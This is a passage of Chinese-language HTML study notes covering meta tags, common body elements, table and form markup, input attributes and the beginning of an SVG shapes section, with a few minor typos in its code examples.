<code>&lt;style&gt;</code> , <code>&lt;link&gt;</code> , <code>&lt;script&gt;</code> 等元素</li>\n</ul>\n<h4 id=\"3-1-metadata-tag\">3-1. metadata tag</h4>\n<ul>\n<li><code>&lt;meta name=&quot;&quot; content=&quot;&quot;&gt;</code></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://poychang.github.io/how-to-use-html-head/\">你可以這樣用 HTML 的 Meta 標籤</a></li>\n<li>提供網頁資訊給瀏覽器、搜尋引擎</li>\n<li>通常用於指定頁面描述、關鍵字、作者…等等資訊</li>\n<li>控制使用者的瀏覽器 viewport（可見區域）\n<br>└ <code>meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no&quot;</code></li>\n<li>網頁編碼\n<br>└ <code>meta charset=&quot;UTF-8&quot;</code></li>\n<li>常用的 meta name 的屬性值\n<br>├ <code>meta name=&quot;author&quot; content=&quot;作者姓名&quot;</code>：記錄網頁的作者名稱\n<br>├ <code>meta name=&quot;description&quot; content=&quot;網頁簡短描述&quot;</code>：網頁的簡短描述\n<br>│ 內容不能太長，需於 200 個字元（100 個中文字）以內\n<br>├ <code>meta name=&quot;generator&quot; content=&quot;編輯器名稱&quot;</code>：記錄網頁編輯器名稱\n<br>├ <code>meta name=&quot;keywords&quot; content=&quot;網頁關鍵字&quot;</code>：放置網頁關鍵字\n<br>└ <code>meta name=&quot;distribution&quot; content=&quot;網頁發佈地區&quot;</code>：記錄網頁的發佈地區</li>\n<li>早期 HTML4.01 的寫法\n<br>├<code>meta http-equiv=&quot;屬性值&quot; content=&quot;內容&quot;</code>\n<br>├ 此屬性值有三種常見的纇型：\n<br>│ <code>content-type</code> 設定網頁文字編碼\n<br>│ <code>default-style</code> 指定要使用的樣式表\n<br>│ <code>refresh</code> 網頁自動刷新的間隔時間\n<br>└ 各屬性值都必須搭配一個 content</li>\n</ul>\n<h3 id=\"4-body\">4. <code>&lt;body&gt;</code></h3>\n<ul>\n<li>網頁文件的主體，主要放置顯示給讀者的內容</li>\n<li>可設置如容器、文字、連結、圖像、表格、清單等內容</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://w3c.hexschool.com/blog/989672eb\">我不知道的 HTML Semantic</a></li>\n</ul>\n<h4 id=\"4-1-tagname-attributenameattributevaluecontenttagname\">4-1. <code>&lt;tagName attributeName=&quot;attributeValue&quot;&gt;Content&lt;/tagName&gt;</code></h4>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.w3schools.com/tags/ref_byfunc.asp\">tagName</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.w3schools.com/tags/ref_standardattributes.asp\">attributeName</a></li>\n<li><code>class</code>\n<br>└ 通常是可以重複使用的 css 用命名</li>\n<li><code>id</code>\n<br>├ 一個元素僅可有一個 id，通常用於 JS 中抓取該元素的辨識方式\n<br>└ 建議留給程式開發／網頁規劃使用</li>\n</ul>\n<h4 id=\"4-2-常見標籤\">4-2. 常見標籤</h4>\n<ul>\n<li><code>div</code>：區塊容器</li>\n<li><code>h1</code>, <code>h2</code>, <code>h3</code>, <code>h4</code>, <code>h5</code>, <code>h6</code>：各級標題</li>\n<li><code>p</code>：文字段落</li>\n<li><code>span</code>：行內文字</li>\n<li><code>a</code>：連結</li>\n<li><code>ol</code>：有序清單</li>\n<li><code>ul</code>：無序清單</li>\n<li><code>img</code>：圖片</li>\n<li><code>audio</code>：聲音</li>\n<li><code>video</code>：影片</li>\n<li><code>canvas</code></li>\n<li><code>details</code>, <code>summary</code>：可折疊內容</li>\n<li><code>dd</code>, <code>dl</code>：定義清單</li>\n<li><code>code</code>：程式碼段落</li>\n</ul>\n<h4 id=\"table-表格\">Table 表格</h4>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>table</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>thead</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>th</span><span class=\"token punctuation\">></span></span>Table Row 1 Table Head<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>th</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>th</span><span class=\"token punctuation\">></span></span>Table Head 2<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>th</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>thead</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tbody</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>Table Row 2 Table Data<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>Table Data 2<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tbody</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>table</span><span class=\"token punctuation\">></span></span></code></pre><ul>\n<li><code>&lt;table&gt;</code>：表格容器</li>\n<li><code>&lt;thead&gt;</code>, <code>&lt;tbody&gt;</code>：表格標頭與內文容器</li>\n<li><code>&lt;tr&gt;</code>：表格行</li>\n<li><code>&lt;th&gt;</code>：標頭內容</li>\n<li><code>&lt;td&gt;</code>：資料內容</li>\n</ul>\n<h4 id=\"form-表單\">Form 表單</h4>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>form<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>form<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>toggle1<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>checkbox<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>label</span> <span class=\"token attr-name\">for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>toggle1<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Toggle me!<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>label</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>toggle2<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>checkbox<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>label</span> <span class=\"token attr-name\">for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>toggle2<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Toggle me!<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>label</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>toggle3<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>checkbox<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>toggle3<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Toggle me!<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>label</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span></code></pre><p><code>&lt;form&gt;</code> 為用來配置輸入與傳輸資料用的表單範圍，建立表單用的基礎元素。</p>\n<p>其屬性有</p>\n<ul>\n<li><code>action</code>：必備，傳送資料的目標 URL</li>\n<li><code>method</code>：傳送資料的 HTTP 方式，常見值為 <code>get</code> 與 <code>post</code>\n<br>├ <code>get</code>：預設值，以 URL 形式傳送表單\n<br>│ 適用於短表單（搜尋框）或從伺服器取得資料\n<br>├ <code>post</code>：以文本資料形式傳送表單\n<br>│ 適用於使用者上傳、長表單、包含敏感性資料（如密碼）、增刪資料庫內容\n<br>├ <code>put</code>：修改\n<br>└ <code>delete</code>：刪除</li>\n<li><code>enctype</code>：適用於 <code>metod</code> 設定為 <code>post</code> 時，指定表單內傳送資料的類型（MIME）為何\n<br>├ 可被 <code>button</code> 或 <code>input</code> 元素裡的 <code>formenctype</code> 屬性複載\n<br>├ <code>application/x-www-form-urlencoded</code>：預設值\n<br>└ <code>multipart/form-data</code>：用於含有檔案傳送欄位（<code>inputtype=&quot;file&quot;</code>）時必須設定</li>\n<li><code>name</code>：表單識別用的名稱，建議與 <code>id</code> 一同使用</li>\n<li><code>novalidate</code>：設定表單</li>\n<li><code>target</code>：設定如何開啟 <code>action</code> 屬性的目標 URL\n<br>├ <code>self</code>：預設值，於同分頁裡載入返回值\n<br>├ <code>blank</code>：於新視窗載入\n<br>├ <code>parent</code>：於父框架內載入，若無父元素則同 <code>self</code>\n<br>├ <code>top</code>：在當前文件檔裡的最高元素內載入，若無父元素則同 <code>self</code>\n<br>└ <code>framename</code>：指定於何框架載入</li>\n<li><code>autocomplete</code>：設定是否自動完成表單內容\n<br>├ <code>on</code>：可根據輸入歷史紀錄自動輸入\n<br>└ <code>off</code>：瀏覽器不會自動輸入</li>\n</ul>\n<h4 id=\"input-輸入\">Input 輸入</h4>\n<ul>\n<li><code>&lt;input&gt;</code> 元素用來配置表單內的輸入欄位</li>\n<li>可以使用 <code>type</code> 屬性來配置各種不同類型的輸入欄位。</li>\n<li><code>type</code> 可用 3 種類型分類： 1. 按鈕、2. 輸入欄位、3. 其它\n<br>├ 1. 按鈕：\n<br>│ <code>submit</code>：傳送表單\n<br>│ <code>rest</code>：重設表單\n<br>│ <code>button</code>：通用按鈕\n<br>│ <code>image</code>：圖片式傳送按鈕\n<br>├ 2. 輸入欄位：\n<br>│ <code>text</code>：單行文字\n<br>│ <code>search</code>：搜尋關鍵字\n<br>│ <code>tel</code>：電話\n<br>│ <code>url</code>：網址\n<br>│ <code>email</code>：電子信箱\n<br>│ <code>password</code>：密碼\n<br>│ <code>datetime</code>：UTC 日期時間\n<br>│ <code>datetime-local</code>：本地日期時間\n<br>│ <code>date</code>：日期\n<br>│ <code>month</code>：月份\n<br>│ <code>week</code>：星期\n<br>│ <code>time</code>：時間\n<br>│ <code>number</code>：數值\n<br>│ <code>range</code>：範圍\n<br>│ <code>color</code>：顏色\n<br>├ 3. 其它：\n<br>│ <code>checkbox</code>：複選方塊\n<br>│ <code>radio</code>：單選按鈕\n<br>│ <code>file</code>：檔案選擇\n<br>└ <code>hidden</code>：隱藏欄位</li>\n<li><code>name</code>：欄位識別用的名稱，建議與 <code>id</code> 一同使用。</li>\n<li><code>value</code>：欄位預設值，<code>checkbox</code> 與 <code>radio</code> 類型的欄位此屬性不可為空。</li>\n<li><code>maxlength</code>：指定欄位寬度，若為文字類型欄位則此數值為文字字數寬度，其於則為像素寬度。</li>\n<li><code>checked</code>：設定該欄位為已選定，使用於 <code>checkbox</code> 與 <code>radio</code> 欄位。</li>\n<li><code>disabled</code>：設定該輸入欄位不可使用。</li>\n<li><code>readonly</code>：設定該輸入欄位不可變更。</li>\n<li><code>src</code>：使用於 <code>image</code> 欄位，設定圖片來源網址。</li>\n<li><code>alt</code>：使用於 <code>image</code> 欄位，設定圖片無法顯示時的替代文字。</li>\n<li><code>align</code>：使用於 <code>image</code> 欄位，設定圖片與文字的排列方式。</li>\n<li><code>tabindex</code>：設定當按下 Tab 鍵時，項目移動的順序，會從屬性值最小者開始移動。</li>\n<li><code>accesskey</code>：設定快捷鍵文字。</li>\n<li><code>accept</code>：設定伺服器處理該欄位資料時，可接受的 MIME 型態，可指定複數種型態。</li>\n<li><code>autocomplete</code>：設定是否自動完成表單內容。</li>\n<li><code>list</code>：指定欄位的候選資料列表。</li>\n<li><code>required</code>：設定該欄位是否不可為空。</li>\n<li><code>pattern</code>：設定欄位正規表達式。</li>\n<li><code>step</code>：可使用 <code>min</code> 與 <code>max</code> 屬性限制數字或日期時間的增量。</li>\n<li><code>max</code>：最大值。</li>\n<li><code>min</code>：最小值。</li>\n<li><code>placeholder</code>：顯示於欄位中的提示用預設值。</li>\n<li><code>form</code>：設定欄位屬於何個表單，引用值為表單的 <code>id</code>。</li>\n<li><code>formaction</code>：替代表單的 <code>enctype</code> 屬性用。</li>\n<li><code>formmethod</code>：替代表單的 <code>method</code> 屬性用。</li>\n<li><code>formnovalidate</code>：替代表單的 <code>novalidate</code> 屬性用。</li>\n<li><code>formtarget</code>：替代表單的 <code>target</code> 屬性用。</li>\n<li><code>width</code>：設定 <code>image</code> 欄位的按鈕圖片寬度。</li>\n</ul>\n<h4 id=\"其它元素\">其它元素</h4>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>section</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>label</span> <span class=\"token attr-name\">for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>email<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>top-label<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>E-mail<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>label</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>email type=<span class=\"token punctuation\">\"</span></span><span class=\"token attr-name\">email\"</span> <span class=\"token attr-name\">autocomplete</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>off<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>section</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>section</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>label</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>top-label<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span> How do you know us? <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>label</span><span class=\"token punctuation\">></span></span>\n\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>how-friend<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>how<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>radio<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>label</span> <span class=\"token attr-name\">for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>how-friend<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>side-label<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>From Friend<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>label</span><span class=\"token punctuation\">></span></span>\n\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>how-internet<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>how<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>radio<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>label</span> <span class=\"token attr-name\">for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>how-internet<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>side-label<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>From Internet<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>label</span><span class=\"token punctuation\">></span></span>\n\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>how-other<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>how<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>radio<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>label</span> <span class=\"token attr-name\">for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>how-other<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>side-label<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Other<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>label</span><span class=\"token punctuation\">></span></span>\n\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>how-other-disclousure<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>label</span> <span class=\"token attr-name\">for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>how-other-explain<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>top-label<span class=\"token punctuation\">\"</span></span>\n      <span class=\"token punctuation\">></span></span>Please describe the reason.<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>label</span>\n    <span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>textarea</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>how-other-explain<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>textarea</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>section</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>section</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>permitted<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>checkbox<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>label</span> <span class=\"token attr-name\">for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>permitted<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>side-label<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Agree to send the form<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>label</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>blocked<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Please check agree to send form<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button</span><span class=\"token punctuation\">></span></span>Send<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>section</span><span class=\"token punctuation\">></span></span></code></pre><ul>\n<li><code>&lt;button&gt;</code> 同於 <code>&lt;input&gt;</code> 元素，並可於內容裡放置圖片與文字。</li>\n<li><code>&lt;textarea&gt;</code> 用來配置表單中多行文字輸入欄位，元素標籤內容的文字將成為多行輸入的預設資料。</li>\n<li><code>&lt;select&gt;</code> 用來配置多重選項的選單物件，項目使用 <code>&lt;option&gt;</code>。</li>\n<li><code>&lt;option&gt;</code> 用於定義在 <code>&lt;select&gt;</code>、 <code>&lt;optgroup&gt;</code> 或 <code>&lt;datalist&gt;</code>元素中包含的選單項目。</li>\n<li><code>optgroup</code> 用來建立 <code>&lt;option&gt;</code> 的群組。</li>\n<li><code>&lt;label&gt;</code> 可用於\n<br>├ 1. 將文字敘述與表單輸入欄位一同包起來。\n<br>└ 2. 獨立於表單之外，使用 <code>for</code> 屬性設定代表何個表單的控制選項。</li>\n<li><code>&lt;fieldset&gt;</code>：群組化表單欄位</li>\n<li><code>&lt;legend&gt;</code>：表單欄位的標籤</li>\n<li><code>&lt;datalist&gt;</code>：候選清單</li>\n<li><code>&lt;keygen&gt;</code>：加密金鑰</li>\n<li><code>&lt;output&gt;</code>：資料輸出</li>\n<li><code>&lt;progress&gt;</code>：進度條</li>\n<li><code>&lt;meter&gt;</code>：測量值</li>\n</ul>\n<h4 id=\"svg\">SVG</h4>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://ithelp.ithome.com.tw/articles/10161004\">Day30 - SVG 完整教學 30+1 天 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://intersection.tw/%E8%A8%AD%E8%A8%88%E5%B8%AB%E5%B0%8D-svg-%E6%87%89%E8%A9%B2%E6%9C%89%E7%9A%84%E8%A7%80%E5%BF%B5-38ba64b48b32\">設計師對 SVG 應該有的觀念</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://codepen.io/anthonydugois/pen/mewdyZ\">SVG Path Builder</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://getwaves.io/\">Get Waves – Create SVG waves for your next design</a></li>\n</ul>\n<h5 id=\"1-基本介紹\">1. 基本介紹</h5>\n<ul>\n<li>SVG 向量圖形的特色使其能自由縮放，並能搭配 JS 做出互動效果</li>\n<li>但由於運算效能的原因，不適合用於較為複雜的圖形</li>\n<li>不受 CSS box model 管轄</li>\n<li>會在 SVG Canvas 底下渲染</li>\n<li>SVG Canvas 需要對應有限尺寸的 viewport</li>\n</ul>\n<h5 id=\"2-可用圖形\">2. 可用圖形</h5>\n<p>SVG 有提供幾種基本形狀供使用：</p>\n<ol>\n<li>矩形：<code>&lt;rect id=&quot;A&quot; x=&quot;33&quot; y=&quot;34&quot; fill=&quot;#FF6CC4&quot; stroke=&quot;#C30D23&quot; stroke-width=&quot;3&quot; width=&quot;75&quot; height=&quot;75&quot;/&gt;</code>\n<br>├ <code>id</code>：該圖形的名稱\n<br>├ <code>x</code>、<code>y</code>：圖形左上的錨點\n<br>├ <code>fill</code>：圖形填充色\n<br>├ <code>stroke</code>：框線顏色\n<br>├ <code>stroke-width</code>：框線寬度\n<br>└ <code>width</code>、<code>height</code>：圖形寬高，單位為 px</li>\n<li>圓角矩形：<code>&lt;rect x=&quot;60&quot; y=&quot;10&quot; rx=&quot;10&quot; ry=&quot;10&quot; width=&quot;75&quot; height=&quot;75&quot; stroke=&quot;#FF5500&quot; stroke-width=&quot;5&quot; fill=&quot;#FFB255&quot;/&gt;</code>\n<br>├ 於原本的矩形裡再新增圓角半徑屬性 <code>rx</code>、<code>ry</code>\n<br>└ 使用 Illustrator 產出的 SVG 會轉換成 <code>path</code> 圖形</li>\n<li>圓形：<code>&lt;circle fill=&quot;#FF4343&quot; stroke=&quot;#890000&quot; stroke-width=&quot;5&quot; cx=&quot;80.141&quot; cy=&quot;73.446&quot; r=&quot;44&quot;/&gt;</code>\n<br>├ <code>cx</code>、<code>cy</code>：圖形圓心\n<br>└ <code>r</code>：半徑</li>\n<li>橢圓：<code>&lt;ellipse fill=&quot;#77DD47&quot; stroke=&quot;#246614&quot; stroke-width=&quot;5&quot; cx=&quot;100&quot; cy=&quot;75&quot; rx=&quot;67&quot; ry=&quot;44&quot;/&gt;</code>\n<br>└ 橢圓另外還有 x 方向的半徑 <code>rx</code> 與 y 方向的半徑 <code>ry</code></li>\n<li>多邊形 